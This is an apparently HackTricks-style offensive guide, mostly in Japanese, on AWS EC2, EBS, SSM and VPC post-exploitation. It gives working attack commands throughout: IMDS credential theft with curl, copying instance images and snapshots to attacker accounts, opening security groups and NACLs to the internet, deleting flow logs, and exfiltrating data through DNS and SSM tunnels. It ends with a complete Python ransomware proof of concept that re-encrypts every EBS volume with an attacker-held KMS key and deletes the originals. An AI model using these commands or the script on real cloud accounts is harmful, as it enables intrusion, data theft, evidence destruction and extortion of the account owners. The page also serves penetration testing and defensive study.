# AWS - EC2, EBS, SSM & VPC Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## EC2 & VPC

詳細は次を参照してください：

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### **Malicious VPC Mirror -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC traffic mirroring は、インスタンス自体に何かをインストールする必要なく、VPC 内の EC2 インスタンスの着信および発信トラフィックを複製します。複製されたトラフィックは通常、解析や監視のためにネットワーク侵入検知システム (IDS) のようなものに送られます。\
攻撃者はこれを悪用してすべてのトラフィックを取得し、機密情報を入手する可能性があります：

詳細は次のページを参照してください：

{{#ref}}
aws-malicious-vpc-mirror.md
{{#endref}}

### 実行中インスタンスのコピー

インスタンスには通常、何らかの機密情報が含まれています。侵入する方法はいくつかあります（詳細は [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc/README.md) を参照）。ただし、その中身を確認する別の方法として、**AMI を作成し、それから新しいインスタンスを起動する（自分のアカウント内でも可）** があります：
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**Snapshotsはボリュームのバックアップです**、通常は**機密情報**を含むため、確認するとその情報が明らかになります。\
もし**snapshotのない volume**を見つけたら、**Create a snapshot**して以下の操作を行うか、アカウント内のインスタンスに**mount it in an instance**するだけです:

{{#ref}}
aws-ebs-snapshot-dump.md
{{#endref}}

### Covert Disk Exfiltration via AMI Store-to-S3

CreateStoreImageTaskを使ってEC2 AMIを直接S3にエクスポートし、スナップショット共有なしで生のディスクイメージを取得します。これにより、インスタンスのネットワーク設定を変更せずに完全なオフライン鑑識やデータ窃取が可能になります。

{{#ref}}
aws-ami-store-s3-exfiltration.md
{{#endref}}

### Live Data Theft via EBS Multi-Attach

io1/io2のMulti-Attachボリュームを別のインスタンスにアタッチし、読み取り専用でマウントしてスナップショットを作成せずにライブデータを吸い上げます。被害ボリュームが同一AZ内で既にMulti-Attach有効の場合に有用です。

{{#ref}}
aws-ebs-multi-attach-data-theft.md
{{#endref}}

### EC2 Instance Connect Endpoint Backdoor

EC2 Instance Connect Endpointを作成し、ingressを許可してエフェメラルなSSHキーを注入し、マネージドトンネル経由でプライベートインスタンスにアクセスします。パブリックポートを開けずに迅速なラテラルムーブメント経路を提供します。

{{#ref}}
aws-ec2-instance-connect-endpoint-backdoor.md
{{#endref}}

### EC2 ENI Secondary Private IP Hijack

被害者のENIのセカンダリプライベートIPを攻撃者管理下のENIに移動して、IPで許可された信頼ホストを偽装します。特定のアドレスに紐づく内部ACLやSGルールのバイパスを可能にします。

{{#ref}}
aws-eni-secondary-ip-hijack.md
{{#endref}}

### Elastic IP Hijack for Ingress/Egress Impersonation

被害インスタンスからElastic IPを攻撃者に再関連付けすることで、受信トラフィックを傍受したり、信頼されたパブリックIPからの発信のように見えるアウトバウンド接続を発信できます。

{{#ref}}
aws-eip-hijack-impersonation.md
{{#endref}}

### Security Group Backdoor via Managed Prefix Lists

セキュリティグループのルールがcustomer-managed prefix listを参照している場合、攻撃者のCIDRをそのリストに追加すると、SG自体を変更せずに依存するすべてのSGルールでアクセスが静かに拡大します。

{{#ref}}
aws-managed-prefix-list-backdoor.md
{{#endref}}

### VPC Endpoint Egress Bypass

gatewayまたはinterfaceのVPC endpointを作成して、隔離されたサブネットからのアウトバウンドアクセスを回復します。AWS-managed private linksを活用することで、IGW/NATの不在による制御を回避してデータの流出が可能になります。

{{#ref}}
aws-vpc-endpoint-egress-bypass.md
{{#endref}}

### `ec2:AuthorizeSecurityGroupIngress`

ec2:AuthorizeSecurityGroupIngressの権限を持つ攻撃者は、セキュリティグループにインバウンドルールを追加できます（例: 0.0.0.0/0からのtcp:80を許可するなど）。これにより内部サービスがパブリックインターネットや本来許可されていないネットワークに晒されます。
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
```
# `ec2:ReplaceNetworkAclEntry`
ec2:ReplaceNetworkAclEntry（または類似の）権限を持つ攻撃者は、subnet の Network ACLs (NACLs) を変更して非常に許容的にすることができます — 例えば重要なポートで 0.0.0.0/0 を許可することで、サブネット全体の範囲をインターネットや権限のないネットワークセグメントにさらしてしまいます。インスタンス単位で適用される Security Groups と異なり、NACLs はサブネットレベルで適用されるため、制限的な NACL を変更すると、多数のホストへのアクセスを可能にして、はるかに大きな blast radius をもたらす可能性があります。
```bash
aws ec2 replace-network-acl-entry \
--network-acl-id <ACL_ID> \
--rule-number 100 \
--protocol <PROTOCOL> \
--rule-action allow \
--egress <true|false> \
--cidr-block 0.0.0.0/0
```
### `ec2:Delete*`

ec2:Delete* と iam:Remove* の権限を持つ攻撃者は、重要なインフラリソースや設定（例えば key pairs、launch templates/versions、AMIs/snapshots、volumes や attachments、security groups や rules、ENIs/network endpoints、route tables、gateways、または managed endpoints）を削除できます。これは即時のサービス停止、データ損失、フォレンジック証拠の喪失を引き起こします。

一例として security group を削除するコマンド:

aws ec2 delete-security-group \
--group-id <SECURITY_GROUP_ID>

### VPC Flow Logs Cross-Account Exfiltration

VPC Flow Logs を攻撃者が管理する S3 バケットに向けることで、被害アカウント外にネットワークのメタデータ（送信元/宛先、ポート）を継続的に収集し、長期的な偵察に利用されます。

{{#ref}}
aws-vpc-flow-logs-cross-account-exfiltration.md
{{#endref}}

### Data Exfiltration

#### DNS Exfiltration

たとえ EC2 のアウトバウンドを制限しても、**exfil via DNS** は可能です。

- **VPC Flow Logs はこれを記録しません**。
- AWS DNS logs へのアクセス権はありません。
- これを無効にするには、"enableDnsSupport" を false に設定します:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

攻撃者は自分が管理するアカウントの API エンドポイントを呼び出す可能性があります。Cloudtrail はこれらの呼び出しをログに記録するため、攻撃者は Cloudtrail のログ内で流出したデータを確認できる可能性があります。

### Open Security Group

ネットワークサービスへのさらなるアクセスを得るために、次のようにポートを開放することができます：
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
### Privesc to ECS

EC2 container instance上で動く任意のECS task内での侵害は、通常ホスト権限やそのノード上の他のすべてのtaskに紐づくIAM rolesへピボットするのに十分です。**ECS-on-EC2にはタスク分離がない**ため、各タスクはデフォルトでEC2 Instance Metadata Service (IMDS) を問い合わせてコンテナ instance profile を盗み、ECS agent がコントロールプレーンとやり取りするのと同じWebSocketプロトコル（**ECScape**プリミティブ）で接続して、そのホスト上で現在スケジュールされているすべてのタスクの資格情報を要求できます。Latacoraはこのワークフローを彼らの [ECS-on-EC2 IMDS research](https://www.latacora.com/blog/2025/10/02/ecs-on-ec2-covering-gaps-in-imds-hardening/) で文書化しており、以下はその攻撃的な要約です。

#### Attack chain

1. **Steal the instance profile from inside the container.** IMDSv2 が要求されていると仮定して、まずトークンを要求し、それからプロファイルを取得します。

```bash
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/{InstanceProfileName}
```

2. **Use the container instance role to impersonate the ECS agent.** それらの資格情報を使えば、ECS agent が使う非公開のWebSocketチャネルで通信できます；コントロールプレーンはあなたを本物のエージェントとして信頼し、ホスト上で現在稼働中の**すべてのタスクのIAM資格情報**をあなたのプロセスに配信します。これにより、ローカルでより高権限のタスクを実行したり、タスク環境のシークレットをダンプしたり、サービス/タスクを更新して完全に調査できるワークロードを再デプロイしたりできます。

#### IMDS reachability with IMDSv2 + hop limit 1

`HttpTokens=required` と `HttpPutResponseHopLimit=1` を設定しても、追加のホップ（Docker bridge）の背後にいるタスクだけがブロックされます。他のネットワークモードはNitroコントローラから1ホップ以内に留まるため、トークンとメタデータの応答は届きます：

| ECS network mode | IMDS reachable? | Reason |
| --- | --- | --- |
| `awsvpc` | ✅ | 各タスクが専用のENIを持ち、IMDSからはまだ1ホップ内なのでトークンとメタデータの応答は正常に到達します。 |
| `host` | ✅ | タスクはホストのネームスペースを共有するため、EC2インスタンスと同じホップ距離が見えます。 |
| `bridge` | ❌ | 余分なホップがDocker bridge上でホップ制限を使い果たすため、応答が失われます。 |

したがって、**hop limit 1 が awsvpc や host モードのワークロードを保護するとは決して仮定しないでください** — コンテナ内から必ずテストしてください。

#### Detecting IMDS blocks per network mode

- **awsvpc tasks:** Nitroがオンホストでリンクローカル 169.254.169.254 を注入するため、Security groups、NACL、ルーティングの調整でこのアドレスをブロックすることはできません。`/etc/ecs/ecs.config` を確認し、`ECS_AWSVPC_BLOCK_IMDS=true` が設定されているかを見ます。フラグがない（デフォルト）の場合、タスクから直接IMDSへcurlできます。設定されている場合は、ホスト/エージェントのネームスペースへピボットしてそれを切り替えるか、awsvpc外でツールを実行してください。

- **bridge mode:** hop limit 1 が設定されているのにメタデータ要求が失敗する場合、守備側はおそらく `--in-interface docker+ --destination 169.254.169.254/32 --jump DROP` のような `DOCKER-USER` drop ルールを挿入しています。`iptables -S DOCKER-USER` を列挙するとそれが露見し、root 権限があればルールを削除または順序を変更してからIMDSをクエリできます。

- **host mode:** エージェント設定で `ECS_ENABLE_TASK_IAM_ROLE_NETWORK_HOST=false` を確認してください。その設定はタスクIAMロールを完全に削除するため、再度有効化するか、awsvpcタスクに移行するか、ホスト上の別プロセスを経由して資格情報を盗む必要があります。値が `true`（デフォルト）の場合、カスタムのeBPF/cgroupフィルタが `169.254.169.254` をターゲットにしていない限り、侵害されたコンテナを含む全てのホストモードプロセスがIMDSに到達できます；tc/eBPFプログラムやそのアドレスを参照するiptablesルールを探してください。

Latacoraは、どのネットワークモードがまだメタデータを公開しているかを列挙するためにターゲットアカウントに落とせる [Terraform validation code](https://github.com/latacora/ecs-on-ec2-gaps-in-imds-hardening) も公開しています。これを使って次の行動を計画してください。

どのモードがIMDSを公開しているかを把握したら、任意のECSタスクをターゲットにし、インスタンスプロファイルを要求し、エージェントを偽装してクラスター内の横移動や永続化のために他のすべてのタスクロールを収集することができます。

### Remove VPC flow logs
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### SSM ポートフォワーディング

必要な権限:

- `ssm:StartSession`

SSM はコマンド実行に加え、トラフィックのトンネリングを可能にします。これを悪用して、Security Groups や NACLs のためにネットワークアクセスがない EC2 インスタンスからピボットすることができます。
この機能が有用なシナリオの一つは、[Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) からプライベートな EKS クラスターへピボットする場合です。

> セッションを開始するには SessionManagerPlugin をインストールしておく必要があります: https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. お使いのマシンに SessionManagerPlugin をインストールする
2. 次のコマンドを使って Bastion EC2 にログインします:
```shell
aws ssm start-session --target "$INSTANCE_ID"
```
3. Get the Bastion EC2 AWS temporary credentials with the [Abusing SSRF in AWS EC2 environment](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#abusing-ssrf-in-aws-ec2-environment) script
4. 自分のマシンの `$HOME/.aws/credentials` ファイルに `[bastion-ec2]` プロファイルとして認証情報を転送する
5. Bastion EC2 として EKS にログインする:
```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```
6. `$HOME/.kube/config` ファイルの `server` フィールドを `https://localhost` に設定する
7. 次のように SSM トンネルを作成する:
```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```
8. `kubectl` ツールからのトラフィックは、SSM トンネルを介して Bastion EC2 経由で転送されるようになり、次のコマンドを実行することで自分のマシンからプライベート EKS クラスターにアクセスできます:
```shell
kubectl get pods --insecure-skip-tls-verify
```
注意: SSL 接続は `--insecure-skip-tls-verify` フラグ（または K8s の監査ツールで同等のオプション）を設定しないと失敗する点に注意してください。トラフィックが安全な AWS SSM トンネル経由でトンネリングされているため、あらゆる種類の MitM 攻撃からは保護されています。

最後に、この手法は private EKS クラスターを攻撃することに特有のものではありません。任意のドメインやポートを設定して他の AWS サービスやカスタムアプリケーションへピボットできます。

---

#### Quick Local ↔️ Remote ポートフォワード (AWS-StartPortForwardingSession)

もし EC2 インスタンスからローカルホストへ**1つの TCP ポート**だけ転送する必要がある場合、`AWS-StartPortForwardingSession` SSM ドキュメントを使用できます（リモートホストパラメータは不要です）：
```bash
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8000","localPortNumber"="8000" \
--region <REGION>
```
The command establishes a bidirectional tunnel between your workstation (`localPortNumber`) and the selected port (`portNumber`) on the instance **without opening any inbound Security-Group rules**.

一般的なユースケース:

* **File exfiltration**
1. インスタンス上で、exfiltrateしたいディレクトリを指す簡易HTTPサーバを起動します:

```bash
python3 -m http.server 8000
```

2. ワークステーションからSSM tunnel経由でファイルを取得します:

```bash
curl http://localhost:8000/loot.txt -o loot.txt
```

* **Accessing internal web applications (e.g. Nessus)**
```bash
# Forward remote Nessus port 8834 to local 8835
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8834","localPortNumber"="8835"
# Browse to http://localhost:8835
```
ヒント: 証拠をexfiltratingする前にCompressおよびencryptしておくと、CloudTrailはclear-text contentをログに記録しません:
```bash
# On the instance
7z a evidence.7z /path/to/files/* -p'Str0ngPass!'
```
### AMIを共有
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### 公開およびプライベートな AMIs 内の機密情報を検索

- [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): CloudShovel は **公開またはプライベートな Amazon Machine Images (AMIs) 内の機密情報を検索するための** ツールです。インスタンスをターゲット AMIs から起動し、ボリュームをマウントして、潜在的な secrets や機密データをスキャンするプロセスを自動化します。

### EBS Snapshot の共有
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS Ransomware PoC

S3 post-exploitation notesに示されたRansomwareデモに類似したPoCです。KMSは、さまざまなAWSサービスを簡単に暗号化できることから、Ransomware Management ServiceのRMSに改名されるべきです。

まず、'attacker'のAWSアカウントからKMSにcustomer managed keyを作成します。この例ではAWSにキーのデータを管理させますが、現実のシナリオでは悪意ある行為者がキーをAWSの管理外に保持するでしょう。key policyを変更し、任意のAWSアカウントPrincipalがキーを使用できるようにします。このkey policyでは、アカウント名が 'AttackSim' で、すべてのアクセスを許可するポリシールールは 'Outside Encryption' と名付けられています。
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
キー ポリシールールには、EBS ボリュームを暗号化するために使用できるように、次の操作が有効になっている必要があります:

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

公開アクセス可能なキーが利用できるようになったので、未暗号化の EBS ボリュームがアタッチされた EC2 インスタンスがいくつかある 'victim' アカウントを使用できます。 この 'victim' アカウントの EBS ボリュームが暗号化の対象であり、この攻撃は高権限の AWS アカウントが侵害されたという想定のもとで行われます。

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

S3 の ransomware の例と同様です。 この攻撃では、スナップショットを使用してアタッチされている EBS ボリュームのコピーを作成し、'attacker' アカウントの公開されているキーで新しい EBS ボリュームを暗号化し、元の EBS ボリュームを EC2 インスタンスからデタッチして削除し、最後に新しく暗号化された EBS ボリュームを作成するために使ったスナップショットを削除します。 ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

これにより、アカウント内に残るのは暗号化された EBS ボリュームのみになります。

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

また、スクリプトは元の EBS ボリュームをデタッチして削除するために EC2 インスタンスを停止した点にも注意してください。 元の未暗号化のボリュームはもう消えています。

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

次に、'attacker' アカウントのキー ポリシーに戻り、キー ポリシーから 'Outside Encryption' のポリシールールを削除します。
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": ["kms:CreateGrant", "kms:ListGrants", "kms:RevokeGrant"],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Wait a moment for the newly set key policy to propagate. Then return to the 'victim' account and attempt to attach one of the newly encrypted EBS volumes. You'll find that you can attach the volume.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

But when you attempt to actually start the EC2 instance back up with the encrypted EBS volume it'll just fail and go from the 'pending' state back to the 'stopped' state forever since the attached EBS volume can't be decrypted using the key since the key policy no longer allows it.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

This the python script used. It takes AWS creds for a 'victim' account and a publicly available AWS ARN value for the key to be used for encryption. The script will make encrypted copies of ALL available EBS volumes attached to ALL EC2 instances in the targeted AWS account, then stop every EC2 instance, detach the original EBS volumes, delete them, and finally delete all the snapshots utilized during the process. This will leave only encrypted EBS volumes in the targeted 'victim' account. ONLY USE THIS SCRIPT IN A TEST ENVIRONMENT, IT IS DESTRUCTIVE AND WILL DELETE ALL THE ORIGINAL EBS VOLUMES. You can recover them using the utilized KMS key and restore them to their original state via snapshots, but just want to make you aware that this is a ransomware PoC at the end of the day.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
## 参考資料

- [Latacora - ECS on EC2: Covering Gaps in IMDS Hardening](https://www.latacora.com/blog/2025/10/02/ecs-on-ec2-covering-gaps-in-imds-hardening/)
- [Latacora ecs-on-ec2-gaps-in-imds-hardening Terraform repo](https://github.com/latacora/ecs-on-ec2-gaps-in-imds-hardening)
- [Pentest Partners – How to transfer files in AWS using SSM](https://www.pentestpartners.com/security-blog/how-to-transfer-files-in-aws-using-ssm/)

{{#include ../../../../banners/hacktricks-training.md}}
